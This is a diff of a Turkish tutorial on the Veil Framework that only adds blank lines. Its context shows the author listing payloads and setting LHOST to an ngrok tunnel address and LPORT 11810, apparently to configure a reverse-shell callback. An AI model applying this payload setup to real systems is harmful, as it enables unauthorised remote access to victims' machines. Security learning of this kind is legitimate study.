@@ -39,6 +39,7 @@ Veil Framework Yükleme Referansı: https://github.com/Veil-Framework/Veil
 
 - “list” diyerek payload listelerini görüyorum.
  ![veil iç 2](https://user-images.githubusercontent.com/67163428/191237642-27d90eda-9e55-4c8c-97bc-3dd5bb2aaf65.png)
+ 
  ![veil iç 3](https://user-images.githubusercontent.com/67163428/191237676-251896cd-351d-45bd-ae81-c30235050540.png)
 
 
@@ -47,6 +48,7 @@ Veil Framework Yükleme Referansı: https://github.com/Veil-Framework/Veil
 
 
 -“set LHOST 0.tcp.ngrok.io” yazıyorum. Ngrok üzerinden bize verilen adresi girdim.
+
 - Port olarakta “set LPORT 11810” giriyorum
  ![veil iç 5](https://user-images.githubusercontent.com/67163428/191237931-9790d9fe-b387-4bc5-b377-15838e8aee39.png)
 
